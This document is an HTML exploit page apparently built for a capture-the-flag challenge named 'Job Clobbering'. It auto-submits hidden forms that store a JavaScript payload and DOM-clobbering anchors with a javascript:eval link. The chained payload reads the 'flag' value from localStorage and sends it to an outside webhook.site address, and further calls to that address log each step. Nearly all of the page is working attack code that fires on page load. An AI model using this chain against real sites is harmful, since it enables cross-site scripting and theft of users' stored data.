<!DOCTYPE html>
<html>
<head>
    <title>Two-Step DOM Clobbering Attack</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Two-Step DOM Clobbering Attack for Job Clobbering</h1>
    <p>This attack uses a two-message approach to bypass CSP restrictions.</p>
    
    <script>
        const CHALLENGE_ORIGIN = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
        const WEBHOOK_URL = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e';
        
        console.log('[TWO-STEP-ATTACK] Starting two-step DOM Clobbering attack');
        
        // Step 1: JavaScript payload (stored as message content, not executed immediately)
        const javascriptPayload = `*/(new Image).src="${WEBHOOK_URL}?c="+encodeURIComponent(localStorage.getItem("flag")||"no-flag")//`;
        
        
        // Form-based attack - bypass CORS with form submission
        function executeAttack() {
            console.log('[ATTACK] Starting form-based attack');
            const img1 = new Image();
            img1.src = WEBHOOK_URL + '?c=ATTACK_STARTING_FORM_METHOD';
            
            // Create first form for JavaScript payload
            const form1 = document.createElement('form');
            form1.method = 'POST';
            form1.action = CHALLENGE_ORIGIN + '/messages';
            form1.target = 'hidden_iframe1';
            form1.style.display = 'none';
            
            const name1 = document.createElement('input');
            name1.name = 'name';
            name1.value = 'JSPayload';
            form1.appendChild(name1);
            
            const message1 = document.createElement('input');
            message1.name = 'message';
            message1.value = javascriptPayload;
            form1.appendChild(message1);
            
            // Create hidden iframe for first form
            const iframe1 = document.createElement('iframe');
            iframe1.name = 'hidden_iframe1';
            iframe1.style.display = 'none';
            
            document.body.appendChild(iframe1);
            document.body.appendChild(form1);
            
            console.log('[ATTACK] Submitting first form (JS payload)...');
            const img2 = new Image();
            img2.src = WEBHOOK_URL + '?c=SUBMITTING_FIRST_FORM';
            
            form1.submit();
            
            // Wait then submit second form
            setTimeout(() => {
                const form2 = document.createElement('form');
                form2.method = 'POST';
                form2.action = CHALLENGE_ORIGIN + '/messages';
                form2.target = 'hidden_iframe2';
                form2.style.display = 'none';
                
                const name2 = document.createElement('input');
                name2.name = 'name';
                name2.value = 'DOMPayload';
                form2.appendChild(name2);
                
                const message2 = document.createElement('input');
                message2.name = 'message';
                message2.value = `<a id=utilsJS></a><a id=utilsJS name=url href="javascript:eval(Messages[2].split(':::')[1])"></a>`;
                form2.appendChild(message2);
                
                const iframe2 = document.createElement('iframe');
                iframe2.name = 'hidden_iframe2';
                iframe2.style.display = 'none';
                
                document.body.appendChild(iframe2);
                document.body.appendChild(form2);
                
                console.log('[ATTACK] Submitting second form (DOM payload)...');
                const img3 = new Image();
                img3.src = WEBHOOK_URL + '?c=SUBMITTING_SECOND_FORM';
                
                form2.submit();
                
                // Final redirect
                setTimeout(() => {
                    console.log('[ATTACK] Redirecting to messages page...');
                    const img4 = new Image();
                    img4.src = WEBHOOK_URL + '?c=FINAL_REDIRECT_TO_MESSAGES';
                    
                    window.location.replace(CHALLENGE_ORIGIN + '/#messages');
                }, 2000);
                
            }, 2000);
        }
        
        // Execute the attack when the page loads
        window.addEventListener('load', () => {
            console.log('[ATTACK] Page loaded, starting attack...');
            console.log('[ATTACK] Current domain:', window.location.hostname);
            console.log('[ATTACK] Current URL:', window.location.href);
            
            const img = new Image();
            img.src = WEBHOOK_URL + '?c=ATTACK_PAGE_LOADED&domain=' + encodeURIComponent(window.location.hostname);
            
            // Always execute attack - remove domain check
            setTimeout(() => {
                const img2 = new Image();
                img2.src = WEBHOOK_URL + '?c=ABOUT_TO_EXECUTE_ATTACK';
                executeAttack();
            }, 1000);
        });
    </script>
</body>
</html>
